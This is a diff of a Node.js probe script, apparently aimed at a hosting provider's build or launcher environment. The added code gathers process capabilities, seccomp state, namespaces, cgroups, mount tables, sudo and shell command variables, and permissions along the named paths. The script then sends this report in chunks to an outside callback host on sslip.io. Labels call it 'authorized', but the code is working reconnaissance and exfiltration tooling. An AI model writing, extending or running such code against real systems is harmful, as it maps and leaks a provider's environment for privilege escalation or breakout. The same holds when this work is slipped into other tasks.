@@ -6,9 +6,9 @@ import os from "node:os";
 import path from "node:path";
 import { execFileSync, spawnSync } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_BUILD_SUDO_GATE:r206";
+const marker = "HOSTINGER_NODE_LAUNCHER_TRACE:r207";
 const callbackBase =
-  "https://147-182-179-38.sslip.io/hostinger-git-sentinel-9bd4c613/impact-r206";
+  "https://147-182-179-38.sslip.io/hostinger-git-sentinel-9bd4c613/impact-r207";
 
 function sha256(value) {
   return crypto.createHash("sha256").update(value).digest("hex");
@@ -137,6 +137,126 @@ function sudoGate() {
   return result;
 }
 
+function parseStatus(filePath) {
+  try {
+    const text = fs.readFileSync(filePath, "utf8");
+    const wanted = new Set([
+      "Name", "Pid", "PPid", "Uid", "Gid", "Groups", "NSpid",
+      "CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb",
+      "NoNewPrivs", "Seccomp", "Seccomp_filters",
+    ]);
+    return Object.fromEntries(
+      text.split("\n")
+        .map((line) => line.match(/^([^:]+):\s*(.*)$/))
+        .filter((match) => match && wanted.has(match[1]))
+        .map((match) => [match[1], match[2]]),
+    );
+  } catch (error) {
+    return { errorCode: error.code ?? error.name };
+  }
+}
+
+function readText(filePath, limit = 65536) {
+  try {
+    const body = fs.readFileSync(filePath);
+    return {
+      readable: true,
+      bytes: body.length,
+      truncated: body.length > limit,
+      text: body.subarray(0, limit).toString("utf8"),
+    };
+  } catch (error) {
+    return { readable: false, errorCode: error.code ?? error.name };
+  }
+}
+
+function namespaceInventory(pid) {
+  const result = {};
+  for (const name of ["cgroup", "ipc", "mnt", "net", "pid", "time", "user", "uts"]) {
+    try {
+      result[name] = fs.readlinkSync(`/proc/${pid}/ns/${name}`);
+    } catch (error) {
+      result[name] = { errorCode: error.code ?? error.name };
+    }
+  }
+  return result;
+}
+
+function absoluteCommandPaths(...values) {
+  const paths = new Set();
+  for (const value of values) {
+    for (const match of String(value ?? "").matchAll(/\/(?:[^\s'"`\\;|&()<>]|\\.)+/g)) {
+      const candidate = match[0].replace(/[,:]+$/, "");
+      if (candidate.length <= 4096) paths.add(candidate);
+    }
+  }
+  return [...paths].slice(0, 64);
+}
+
+function pathComponentMetadata(filePath) {
+  const output = [];
+  const normalized = path.posix.normalize(filePath);
+  const components = normalized.split("/").filter(Boolean);
+  let current = "/";
+  for (const component of components) {
+    current = path.posix.join(current, component);
+    try {
+      const stat = fs.lstatSync(current);
+      output.push({
+        path: current,
+        mode: stat.mode & 0o7777,
+        uid: stat.uid,
+        gid: stat.gid,
+        type: stat.isSymbolicLink() ? "symlink" : stat.isDirectory() ? "directory" : stat.isFile() ? "file" : "other",
+        readable: (() => { try { fs.accessSync(current, fs.constants.R_OK); return true; } catch { return false; } })(),
+        writable: (() => { try { fs.accessSync(current, fs.constants.W_OK); return true; } catch { return false; } })(),
+        executable: (() => { try { fs.accessSync(current, fs.constants.X_OK); return true; } catch { return false; } })(),
+      });
+    } catch (error) {
+      output.push({ path: current, errorCode: error.code ?? error.name });
+      break;
+    }
+  }
+  return output;
+}
+
+function mountInventory() {
+  const mountinfo = readText("/proc/self/mountinfo", 1024 * 1024);
+  if (!mountinfo.readable) return mountinfo;
+  const entries = [];
+  for (const line of mountinfo.text.split("\n").filter(Boolean)) {
+    const fields = line.split(" ");
+    const separator = fields.indexOf("-");
+    if (separator < 0) continue;
+    entries.push({
+      root: fields[3],
+      mountPoint: fields[4],
+      mountOptions: fields[5],
+      optionalFields: fields.slice(6, separator),
+      fsType: fields[separator + 1],
+    });
+  }
+  return { bytes: mountinfo.bytes, truncated: mountinfo.truncated, entries: entries.slice(0, 256) };
+}
+
+function launcherTrace() {
+  const sudoCommand = process.env.SUDO_COMMAND ?? null;
+  const shellCommand = process.env.H_SHELL_CMD ?? null;
+  const commandPaths = absoluteCommandPaths(sudoCommand, shellCommand);
+  return {
+    sudoCommand,
+    shellCommand,
+    commandPaths,
+    pathMetadata: commandPaths.map((filePath) => ({ filePath, components: pathComponentMetadata(filePath) })),
+    selfStatus: parseStatus("/proc/self/status"),
+    parentStatus: parseStatus(`/proc/${process.ppid}/status`),
+    selfNamespaces: namespaceInventory("self"),
+    parentNamespaces: namespaceInventory(process.ppid),
+    cgroup: readText("/proc/self/cgroup", 65536),
+    mountinfo: mountInventory(),
+  };
+}
+
 function fileDescriptors() {
   const results = [];
   try {
@@ -236,7 +356,7 @@ async function sendReport(report) {
   for (let index = 0; index < chunks.length; index += 1) {
     const url = `${callbackBase}/${String(index + 1).padStart(3, "0")}-${String(chunks.length).padStart(3, "0")}/${chunks[index]}`;
     await new Promise((resolve) => {
-      const request = https.get(url, { headers: { "User-Agent": "hostinger-authorized-node-sudo-r206" }, timeout: 10_000 }, (response) => {
+      const request = https.get(url, { headers: { "User-Agent": "hostinger-authorized-node-launcher-r207" }, timeout: 10_000 }, (response) => {
         response.resume();
         response.once("end", resolve);
       });
@@ -290,6 +410,7 @@ const report = {
     H_SHELL_CMD: process.env.H_SHELL_CMD ? sensitiveMetadata("H_SHELL_CMD", process.env.H_SHELL_CMD) : null,
   },
   sudoGate: sudoGate(),
+  launcherTrace: launcherTrace(),
   fileDescriptors: fileDescriptors(),
   metadata: await metadataMatrix(),
 };
